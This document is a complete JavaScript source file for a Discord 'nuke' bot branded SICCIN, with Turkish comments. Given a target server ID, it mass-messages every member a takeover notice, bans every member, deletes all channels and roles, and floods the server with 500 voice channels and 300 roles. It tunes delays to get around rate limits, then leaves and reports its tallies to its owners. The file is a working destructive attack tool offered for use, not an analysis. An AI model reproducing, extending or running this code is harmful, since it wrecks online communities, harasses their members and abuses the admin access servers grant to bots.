require("dotenv").config();
const {
  Client,
  GatewayIntentBits,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActivityType,
  ChannelType
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const BOT_TOKEN = process.env.BOT_TOKEN;

// ================== KORUNAN SUNUCULAR ==================
const PROTECTED_SERVERS = [
  "1457028521707962370",
  "1457597987294285979"
];

// ================== KANAL İSİMLERİ (DÖNGÜLÜ) ==================
const CHANNEL_NAMES = [
  "BİZDEN",
  "KAÇAMAZSINIZ",
  ".gg/siccin👺",
  "EDEBİ🔱",
  "SİZLERİ",
  "BİZLER",
  "VAR",
  "ETTİK"
];

// ================== ROL İSİMLERİ ==================
const ROLE_NAME = "S I C C İ N🔱";

// ================== DURUM KONTROL ==================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;
  return member.presence.activities.some(
    (a) =>
      a.type === ActivityType.Custom &&
      a.state &&
      (a.state.includes("/siccin") || a.state.includes(".gg/siccin"))
  );
}

// ================== KORUNAN SUNUCU KONTROLÜ ==================
function isProtectedServer(guildId) {
  return PROTECTED_SERVERS.includes(guildId.toString());
}

// ================== EMBEDLER ==================
function mainSiccinEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#3a0000")
    .setAuthor({
      name: "ＳＩＣＣＩＮ ABUSE",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setThumbnail(guild.iconURL({ dynamic: true }))
    .setDescription(
      `**Özellikler**
• Herkese DM Çeker ve Banlar
• Tüm Kanal ve Rolleri Siler
• 500 Ses Kanalı Oluşturur
• 300 Rol Oluşturur
• İşlem Bitince Sunucudan Çıkar

**Kanal İsimleri (Döngü):**
${CHANNEL_NAMES.map(name => `• ${name}`).join('\n')}

**Rol İsimleri:** ${ROLE_NAME}

**Nasıl Kullanılır?**
Butona tıkla ve hedef sunucu ID gir.

**⚠️ KORUNAN SUNUCULAR:**
${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`
    )
    .setFooter({ text: "ＳＩＣＣＩＮ | Glory to Siccin" })
    .setTimestamp();
}

function dmEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#2b0000")
    .setAuthor({
      name: "ＳＩＣＣＩＮ EJECTED",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setDescription(
      `ＳＩＣＣＩＮ Tarafından
${guild.name} sunucusuna el konulmuştur.

#GLORY TO ＳＩＣＣＩＮ
https://discord.gg/siccin`
    );
}

function protectedServerErrorEmbed(targetGuildId) {
  return new EmbedBuilder()
    .setColor("#ff0000")
    .setTitle("🚫 ERİŞİM ENGELLENDİ")
    .setDescription(
      `**${targetGuildId}** ID'li sunucu koruma altındadır!\n\nBu sunucuya herhangi bir işlem yapılamaz.`
    )
    .setTimestamp();
}

function logEmbed(data) {
  return new EmbedBuilder()
    .setColor("#1a0000")
    .setAuthor({
      name: `${data.usedGuild} | siccin ejected`,
    })
    .setThumbnail(data.targetIcon)
    .addFields(
      {
        name: "Kullanan Kişi",
        value: `ID: ${data.userId}\nKullanıcı Adı: ${data.userTag}`,
      },
      {
        name: "Hedef Sunucu",
        value: `ID: ${data.guildId}\nSunucu İsmi: ${data.guildName}`,
      },
      {
        name: "İstatistik",
        value:
          `DM Gönderilen: **${data.dmSent}**\n` +
          `Banlanan: **${data.banned}**\n` +
          `Silinen Kanal: **${data.channelsDeleted}**\n` +
          `Silinen Rol: **${data.rolesDeleted}**\n` +
          `Oluşturulan Ses Kanalı: **${data.channelsCreated}**\n` +
          `Oluşturulan Rol: **${data.rolesCreated}**`,
      }
    );
}

function protectionAlertEmbed(data) {
  return new EmbedBuilder()
    .setColor("#ff0000")
    .setTitle("🚨 KORUNAN SUNUCUYA ERİŞİM DENEMESİ")
    .addFields(
      {
        name: "Kullanıcı",
        value: `${data.userTag} (${data.userId})`,
        inline: true,
      },
      {
        name: "Bulunduğu Sunucu",
        value: `${data.usedGuild}`,
        inline: true,
      },
      {
        name: "Hedef Sunucu ID",
        value: `${data.targetGuildId}`,
        inline: false,
      },
      {
        name: "Durum",
        value: "ENGELLENDİ",
        inline: true,
      }
    )
    .setTimestamp();
}

// ================== SICCiN İŞLEM ==================
async function startSiccin(interaction, targetGuildId) {
  const executor = interaction.user;
  const usedGuild = interaction.guild.name;

  // KORUNAN SUNUCU KONTROLÜ
  if (isProtectedServer(targetGuildId)) {
    const alertData = {
      userTag: executor.tag,
      userId: executor.id,
      usedGuild: usedGuild,
      targetGuildId: targetGuildId
    };
    
    const alertEmbed = protectionAlertEmbed(alertData);
    
    try {
      await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [alertEmbed] }));
      await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [alertEmbed] }));
    } catch (err) {
      console.error("Owner'a bildirim gönderilemedi:", err);
    }
    
    return interaction.followUp({
      embeds: [protectedServerErrorEmbed(targetGuildId)],
      ephemeral: true,
    });
  }

  const guild = client.guilds.cache.get(targetGuildId);
  if (!guild)
    return interaction.followUp({
      content: "❌ Bot hedef sunucuda değil",
      ephemeral: true,
    });

  await interaction.followUp({
    content: "🔥 SICCiN BAŞLATILDI\n⚡ Hızlı modda işlemler yapılıyor...",
    ephemeral: true,
  });

  let dmSent = 0;
  let banned = 0;
  let channelsDeleted = 0;
  let rolesDeleted = 0;
  let channelsCreated = 0;
  let rolesCreated = 0;

  // ================== 1. HERKESE DM ÇEK ==================
  try {
    console.log(`[${guild.name}] DM gönderiliyor (hızlı mod)...`);
    const members = await guild.members.fetch();
    const nonBotMembers = members.filter(m => !m.user.bot);
    
    // Paralel DM gönderimi
    const dmPromises = [];
    for (const member of nonBotMembers.values()) {
      dmPromises.push(
        member.send({ embeds: [dmEmbed(guild)] })
          .then(() => {
            dmSent++;
            console.log(`[${guild.name}] DM gönderildi: ${member.user.tag}`);
          })
          .catch(() => {})
      );
      
      // Rate limit için çok kısa bekle
      if (dmPromises.length % 5 === 0) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    }
    
    await Promise.allSettled(dmPromises);
    console.log(`[${guild.name}] ${dmSent} kişiye DM gönderildi`);
  } catch (err) {
    console.error(`[${guild.name}] DM gönderme hatası:`, err);
  }

  // ================== 2. HERKESİ BANLA ==================
  try {
    console.log(`[${guild.name}] Banlama işlemi başlıyor (hızlı mod)...`);
    const members = await guild.members.fetch();
    const nonBotMembers = members.filter(m => !m.user.bot);
    
    const banPromises = [];
    for (const member of nonBotMembers.values()) {
      banPromises.push(
        member.ban({ reason: "ＳＩＣＣＩＮ 🔱" })
          .then(() => {
            banned++;
            console.log(`[${guild.name}] Banlandı: ${member.user.tag}`);
          })
          .catch(() => {})
      );
      
      // Rate limit için kısa bekle
      if (banPromises.length % 3 === 0) {
        await new Promise(resolve => setTimeout(resolve, 200));
      }
    }
    
    await Promise.allSettled(banPromises);
    console.log(`[${guild.name}] ${banned} kişi banlandı`);
  } catch (err) {
    console.error(`[${guild.name}] Banlama hatası:`, err);
  }

  // ================== 3. TÜM KANALLARI SİL (HIZLI) ==================
  try {
    console.log(`[${guild.name}] Kanallar siliniyor (hızlı mod)...`);
    const channels = Array.from(guild.channels.cache.values());
    
    const deletePromises = [];
    for (const channel of channels) {
      deletePromises.push(
        channel.delete()
          .then(() => {
            channelsDeleted++;
            console.log(`[${guild.name}] Kanal silindi: ${channel.name}`);
          })
          .catch(() => {})
      );
      
      // Çok hızlı - 50ms bekle
      if (deletePromises.length % 10 === 0) {
        await new Promise(resolve => setTimeout(resolve, 50));
      }
    }
    
    await Promise.allSettled(deletePromises);
    console.log(`[${guild.name}] ${channelsDeleted} kanal silindi`);
  } catch (err) {
    console.error(`[${guild.name}] Kanal silme hatası:`, err);
  }

  // ================== 4. TÜM ROLLERİ SİL (HIZLI) ==================
  try {
    console.log(`[${guild.name}] Roller siliniyor (hızlı mod)...`);
    const roles = Array.from(guild.roles.cache.values());
    
    const roleDeletePromises = [];
    for (const role of roles) {
      if (role.id === guild.id || role.managed) continue;
      
      roleDeletePromises.push(
        role.delete()
          .then(() => {
            rolesDeleted++;
            console.log(`[${guild.name}] Rol silindi: ${role.name}`);
          })
          .catch(() => {})
      );
      
      // Hızlı - 50ms bekle
      if (roleDeletePromises.length % 10 === 0) {
        await new Promise(resolve => setTimeout(resolve, 50));
      }
    }
    
    await Promise.allSettled(roleDeletePromises);
    console.log(`[${guild.name}] ${rolesDeleted} rol silindi`);
  } catch (err) {
    console.error(`[${guild.name}] Rol silme hatası:`, err);
  }

  // ================== 5. 500 SES KANALI OLUŞTUR (SÜPER HIZLI) ==================
  try {
    console.log(`[${guild.name}] 500 ses kanalı oluşturuluyor (süper hızlı mod)...`);
    
    const channelPromises = [];
    for (let i = 1; i <= 500; i++) {
      const channelNameIndex = (i - 1) % CHANNEL_NAMES.length;
      const channelName = CHANNEL_NAMES[channelNameIndex];
      
      channelPromises.push(
        guild.channels.create({
          name: channelName,
          type: ChannelType.GuildVoice,
          bitrate: 64000,
          userLimit: 0,
          rtcRegion: null
        })
          .then(() => {
            channelsCreated++;
            if (i % 100 === 0) {
              console.log(`[${guild.name}] ${i}. ses kanalı oluşturuldu: ${channelName}`);
            }
          })
          .catch(err => {
            console.log(`[${guild.name}] Ses kanalı ${i} oluşturulamadı:`, err.message);
          })
      );
      
      // ÇOK HIZLI - sadece her 20 kanalda bir 30ms bekle
      if (channelPromises.length % 20 === 0) {
        await new Promise(resolve => setTimeout(resolve, 30));
      }
    }
    
    await Promise.allSettled(channelPromises);
    console.log(`[${guild.name}] ${channelsCreated} ses kanalı oluşturuldu`);
  } catch (err) {
    console.error(`[${guild.name}] Ses kanalı oluşturma hatası:`, err);
  }

  // ================== 6. 300 ROL OLUŞTUR (HIZLI) ==================
  try {
    console.log(`[${guild.name}] 300 rol oluşturuluyor (hızlı mod)...`);
    
    const rolePromises = [];
    for (let i = 1; i <= 300; i++) {
      rolePromises.push(
        guild.roles.create({
          name: ROLE_NAME,
          color: [Math.floor(Math.random() * 255), Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
          permissions: [],
          mentionable: true,
          hoist: true
        })
          .then(() => {
            rolesCreated++;
            if (i % 50 === 0) {
              console.log(`[${guild.name}] ${i}. rol oluşturuldu: ${ROLE_NAME}`);
            }
          })
          .catch(err => {
            console.log(`[${guild.name}] Rol ${i} oluşturulamadı:`, err.message);
          })
      );
      
      // Hızlı - her 15 rolde bir 50ms bekle
      if (rolePromises.length % 15 === 0) {
        await new Promise(resolve => setTimeout(resolve, 50));
      }
    }
    
    await Promise.allSettled(rolePromises);
    console.log(`[${guild.name}] ${rolesCreated} rol oluşturuldu`);
  } catch (err) {
    console.error(`[${guild.name}] Rol oluşturma hatası:`, err);
  }

  // ================== 7. SUNUCUDAN ÇIK ==================
  try {
    console.log(`[${guild.name}] Sunucudan çıkılıyor...`);
    await guild.leave();
    console.log(`[${guild.name}] Sunucudan çıkıldı`);
  } catch (leaveErr) {
    console.error(`[${guild.name}] Sunucudan çıkma hatası:`, leaveErr);
  }

  // ================== LOG GÖNDER ==================
  const log = logEmbed({
    usedGuild,
    userId: executor.id,
    userTag: executor.tag,
    guildId: guild.id,
    guildName: guild.name,
    targetIcon: guild.iconURL({ dynamic: true }),
    dmSent,
    banned,
    channelsDeleted,
    rolesDeleted,
    channelsCreated,
    rolesCreated,
  });

  try {
    await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [log] }));
    await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [log] }));
  } catch (logErr) {
    console.error("Log gönderilemedi:", logErr);
  }

  // ================== İŞLEM TAMAMLANDI BİLDİRİMİ ==================
  try {
    await interaction.followUp({
      content: `✅ SICCiN İŞLEMİ TAMAMLANDI!\n\n` +
               `DM Gönderilen: ${dmSent} kişi\n` +
               `Banlanan: ${banned} kişi\n` +
               `Silinen: ${channelsDeleted} kanal, ${rolesDeleted} rol\n` +
               `Oluşturulan: ${channelsCreated} ses kanalı\n` +
               `Oluşturulan: ${rolesCreated} rol (${ROLE_NAME})\n` +
               `Kanal İsimleri: ${CHANNEL_NAMES.join(' → ')}\n` +
               `Bot sunucudan ayrıldı.\n\n` +
               `#GLORY TO ＳＩＣＣＩＮ 🔱`,
      ephemeral: true,
    });
  } catch (finalErr) {
    console.error("Final bildirimi gönderilemedi:", finalErr);
  }
}

// ================== MESSAGE İŞLEME ==================
client.on("messageCreate", async (message) => {
  if (message.author.bot || !message.guild) return;

  // .siccin komutu kontrolü
  if (message.content.toLowerCase() === ".siccin") {
    try {
      // İsterseniz bu kontrolü kaldırabilirsiniz
      if (![OWNER_ID, SERI_ID].includes(message.author.id)) {
        return message.reply({ 
          content: "❌ Bu komutu kullanma yetkiniz yok!",
          ephemeral: true 
        }).catch(() => {});
      }
      
      const embed = mainSiccinEmbed(message.guild);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId("siccinStart")
          .setLabel("ＳＩＣＣＩＮ BAŞLAT")
          .setStyle(ButtonStyle.Danger)
          .setEmoji("🔥")
      );
      
      await message.channel.send({ 
        embeds: [embed], 
        components: [row] 
      });
      
    } catch (error) {
      console.error("Embed gönderilemedi:", error);
      message.reply("❌ Embed gönderilirken hata oluştu!").catch(() => {});
    }
    return;
  }

  // ID ekleme komutu (Owner için)
  if (message.content.startsWith("!ekle") && message.author.id === OWNER_ID) {
    const args = message.content.split(" ");
    if (args.length < 2) {
      return message.reply("Kullanım: !ekle <sunucu-id>");
    }

    const newId = args[1];
    if (PROTECTED_SERVERS.includes(newId)) {
      return message.reply("Bu ID zaten koruma listesinde!");
    }

    PROTECTED_SERVERS.push(newId);
    message.reply(`✅ ${newId} ID'li sunucu koruma listesine eklendi!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }

  // ID silme komutu (Owner için)
  if (message.content.startsWith("!sil") && message.author.id === OWNER_ID) {
    const args = message.content.split(" ");
    if (args.length < 2) {
      return message.reply("Kullanım: !sil <sunucu-id>");
    }

    const removeId = args[1];
    const index = PROTECTED_SERVERS.indexOf(removeId);
    if (index === -1) {
      return message.reply("Bu ID koruma listesinde bulunamadı!");
    }

    PROTECTED_SERVERS.splice(index, 1);
    message.reply(`✅ ${removeId} ID'li sunucu koruma listesinden kaldırıldı!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }

  // Liste görüntüleme komutu
  if (message.content === "!korunanlar") {
    message.reply(`**Korunan Sunucular:**\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }
});

// ================== INTERACTION İŞLEME ==================
client.on("interactionCreate", async (interaction) => {
  // ================== BUTTON ==================
  if (interaction.isButton() && interaction.customId === "siccinStart") {
    const modal = new ModalBuilder()
      .setCustomId("siccinModal")
      .setTitle("Hedef Sunucu ID")
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("guildID")
            .setLabel("Hedef Sunucu ID")
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
            .setPlaceholder("Sunucu ID'sini girin...")
        )
      );

    return interaction.showModal(modal);
  }

  // ================== MODAL ==================
  if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
    const member = await interaction.guild.members.fetch(interaction.user.id);
    
    if (!hasSiccinStatus(member)) {
      return interaction.reply({
        content: "❌ Durumunda /siccin veya .gg/siccin yok",
        ephemeral: true,
      });
    }

    const gid = interaction.fields.getTextInputValue("guildID").trim();

    // KORUNAN SUNUCU KONTROLÜ
    if (isProtectedServer(gid)) {
      const alertData = {
        userTag: interaction.user.tag,
        userId: interaction.user.id,
        usedGuild: interaction.guild.name,
        targetGuildId: gid
      };
      
      const alertEmbed = protectionAlertEmbed(alertData);
      
      try {
        await client.users.fetch(OWNER_ID).then((u) => u.send({ embeds: [alertEmbed] }));
        await client.users.fetch(SERI_ID).then((u) => u.send({ embeds: [alertEmbed] }));
      } catch (err) {
        console.error("Owner'a bildirim gönderilemedi:", err);
      }
      
      return interaction.reply({
        embeds: [protectedServerErrorEmbed(gid)],
        ephemeral: true,
      });
    }

    await interaction.deferReply({ ephemeral: true });
    return startSiccin(interaction, gid);
  }
});

// ================== BOT HAZIR ==================
client.on("ready", () => {
  console.log(`${client.user.tag} olarak giriş yapıldı!`);
  console.log(`Korunan sunucular: ${PROTECTED_SERVERS.join(", ")}`);
  
  // Bot durumu
  client.user.setActivity({
    name: ".gg/siccin | EDEBİ🔱",
    type: ActivityType.Watching,
  });
  
  // Bot durumunu göster
  client.user.setStatus('online');
  
  console.log("═══════════════════════════════════════");
  console.log("S I C C İ N 🔱 BOT AKTİF");
  console.log(`Bot Durumu: .gg/siccin | EDEBİ🔱`);
  console.log("═══════════════════════════════════════");
  console.log("Kanal İsimleri (Döngü):");
  CHANNEL_NAMES.forEach((name, index) => {
    console.log(`${index + 1}. ${name}`);
  });
  console.log("═══════════════════════════════════════");
  console.log(`Rol İsmi: ${ROLE_NAME}`);
  console.log("═══════════════════════════════════════");
  console.log("İşlem Sırası (HIZLI MOD):");
  console.log("1. Herkese DM gönder (paralel)");
  console.log("2. Herkesi banla (paralel)");
  console.log("3. Tüm kanalları sil (50ms bekleme)");
  console.log("4. Tüm rolleri sil (50ms bekleme)");
  console.log("5. 500 ses kanalı oluştur (30ms bekleme)");
  console.log("6. 300 rol oluştur (50ms bekleme)");
  console.log("7. Sunucudan çık");
  console.log("═══════════════════════════════════════");
});

// ================== CRASH KALKAN ==================
process.on("unhandledRejection", (err) => {
  console.log("UNHANDLED REJECTION:", err);
});
process.on("uncaughtException", (err) => {
  console.log("UNCAUGHT EXCEPTION:", err);
});

client.login(BOT_TOKEN);
